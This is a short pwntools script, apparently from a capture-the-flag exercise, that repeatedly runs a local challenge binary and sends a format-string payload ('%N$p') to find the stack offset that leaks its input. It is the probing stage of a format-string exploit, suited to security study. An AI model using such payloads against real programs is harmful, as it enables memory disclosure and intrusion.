from pwn import *

elf = context.binary = ELF("./chall_patched")

for i in range(100):
    p = process()
    p.sendline(f"AAAAAAAA|%{i}$p".encode())  # Convert to bytes
    p.sendline(b"wualawewa")  # Ensure it's sent as bytes

    try:
        response = p.recvline(timeout=1)  # Use a timeout to avoid blocking
        log.info(f"Ke {i}: {response}")
    except EOFError:
        log.warning(f"Ke {i}: Process exited early")
    
    p.close()
